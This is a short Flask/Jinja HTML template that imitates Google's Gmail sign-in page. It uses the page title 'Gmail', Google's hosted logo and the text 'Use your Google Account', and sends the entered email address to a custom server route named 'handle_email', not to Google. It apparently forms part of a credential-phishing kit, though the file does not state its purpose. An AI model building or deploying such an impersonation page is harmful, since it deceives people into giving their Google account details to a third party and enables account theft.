<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Gmail</title>
	<link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
</head>
<body>
	<div class="login-container">
		<img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_74x24dp.png" alt="Google" class="google-logo">
		<h1>Sign in</h1>
		<p>Use your Google Account</p>

		<form method="post" action="{{ url_for('handle_email') }}">
			<div class="input-group">
				<input type="email" id="username" name="username" placeholder="Email or phone" required>
				<div class="loading-bar" id="loading-bar" style="display: none;"></div>
			</div>
		</form>
	</div>
</body>
</html>
